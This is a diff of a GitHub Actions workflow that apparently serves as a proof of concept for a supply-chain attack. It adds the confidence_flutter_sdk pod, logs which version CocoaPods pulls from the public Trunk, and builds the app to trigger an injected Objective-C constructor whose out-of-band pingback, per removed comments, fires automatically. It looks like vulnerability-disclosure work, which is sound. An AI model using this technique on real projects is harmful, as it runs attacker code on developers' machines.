@@ -1,39 +1,67 @@
-name: Supply Chain RCE Proof
+name: Supply Chain RCE Proof of Concept
 on: [push, workflow_dispatch]
 
 jobs:
-  simulate-developer-machine:
+  poc:
     runs-on: macos-latest
-    
     steps:
       - name: Setup Flutter
         uses: subosito/flutter-action@v2
         with:
           channel: 'stable'
 
-      - name: Simulate Official Integration Guide
+      - name: Step 1 - Create dummy Flutter project
+        run: flutter create rce_test
+
+      - name: Step 2 - Add confidence_flutter_sdk (official README instruction)
         run: |
-          # 1. Create a dummy project (Wadah untuk trigger kerentanan)
-          flutter create rce_test
-          
-          # 2. Masuk ke folder project
           cd rce_test
-          
-          # 3. Patch Podfile agar Deployment Target (iOS 14.0) sesuai dengan podspec lu
-          # Ini buat nge-bypass error "higher minimum deployment target" tadi
-          sed -i '' "s/platform :ios, '13.0'/platform :ios, '14.0'/" ios/Podfile
-          
-          # 4. Tambahkan package (Simulasi instruksi resmi dari README Spotify)
           flutter pub add confidence_flutter_sdk
+
+      - name: Step 3 - Patch iOS deployment target
+        run: |
+          cd rce_test
+          # Print before
+          echo "=== Podfile BEFORE patch ==="
+          cat ios/Podfile
           
-          # 5. Trigger resolusi CocoaPods untuk sisi native iOS
-          cd ios
+          # Patch
+          sed -i '' "s/# platform :ios, '12.0'/platform :ios, '16.0'/" ios/Podfile
+          
+          # Print after
+          echo "=== Podfile AFTER patch ==="
+          cat ios/Podfile
+
+      - name: Step 4 - Pod install (key step - version resolution)
+        run: |
+          cd rce_test/ios
           pod repo update
+          pod install --verbose 2>&1 | tee pod_install.log
           
-          # Log verbose untuk membuktikan sistem menarik versi 1.2.5 dari public Trunk
-          pod install --verbose
+          echo "=== Version resolved ==="
+          grep -i "confidence_flutter_sdk" pod_install.log
+
+      - name: Step 5 - Verify which version was pulled
+        run: |
+          cd rce_test/ios
+          echo "=== Podfile.lock ==="
+          cat Podfile.lock
           
-          # 6. Jalankan Build untuk memicu Objective-C Constructor (__attribute__((constructor)))
-          # Di tahap inilah OAST pingback lu bakal ter-trigger secara otomatis
-          cd ..
-          flutter build ios --no-codesign
+          echo "=== Pod trunk info ==="
+          pod trunk info confidence_flutter_sdk
+
+      - name: Step 6 - Build (trigger constructor execution)
+        run: |
+          cd rce_test
+          flutter build ios --no-codesign 2>&1 | tee build.log
+          echo "=== Build log tail ==="
+          tail -50 build.log
+
+      - name: Step 7 - Upload logs as artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: poc-evidence
+          path: |
+            rce_test/ios/pod_install.log
+            rce_test/ios/Podfile.lock
+            rce_test/build.log
